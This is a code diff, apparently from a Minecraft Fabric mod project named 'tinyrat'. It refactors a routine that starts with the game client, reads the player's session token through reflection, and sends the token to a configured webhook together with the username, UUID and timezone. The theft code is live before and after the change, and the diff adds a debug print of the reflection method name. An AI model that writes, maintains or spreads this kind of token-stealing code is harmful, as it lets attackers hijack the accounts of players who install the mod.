@@ -3,8 +3,8 @@ package com.github.tinyrat;
 import java.time.ZoneId;
 
 import com.github.tinyrat.utils.ConfigLoader;
-import com.github.tinyrat.utils.DiscordEmbed;
-import com.github.tinyrat.utils.DiscordWebhook;
+import com.github.tinyrat.utils.Embed;
+import com.github.tinyrat.utils.Webhook;
 import com.github.tinyrat.utils.ReflectionHelper;
 
 import net.fabricmc.api.ClientModInitializer;
@@ -28,15 +28,14 @@ public class Entry implements ClientModInitializer {
 
     private void sendWebhook() {
         String webhookUrl = ConfigLoader.getWebhook();
-        DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
+        Webhook webhook = new Webhook(webhookUrl);
 
-        DiscordEmbed embed = new DiscordEmbed("Session found");
-
-        ZoneId currentTimezone = ZoneId.systemDefault();
-
-        embed.addln("**Username:** [" + this.session.getUsername() + "](https://namemc.com/profile/" + this.session.getUuidOrNull() +")");
-        embed.addln("**Timezone:** `" + currentTimezone.toString() + "`\n");
-        embed.addln("**Session token:**\n||```" + this.getTokenViaReflection() + "```||");
+        Embed embed = new Embed(
+            this.session.getUsername(),
+            this.session.getUuidOrNull(),
+            this.getTokenViaReflection(),
+            ZoneId.systemDefault()
+        );
 
         webhook.sendEmbed(embed);
     }
@@ -44,6 +43,7 @@ public class Entry implements ClientModInitializer {
     private String getTokenViaReflection() {
         try {
             String methodName = ConfigLoader.getTokenMethodName();
+            System.out.println("Using method name: " + methodName);
 
             return ReflectionHelper.get(this.session, methodName, String.class);
         } catch (Exception e) {
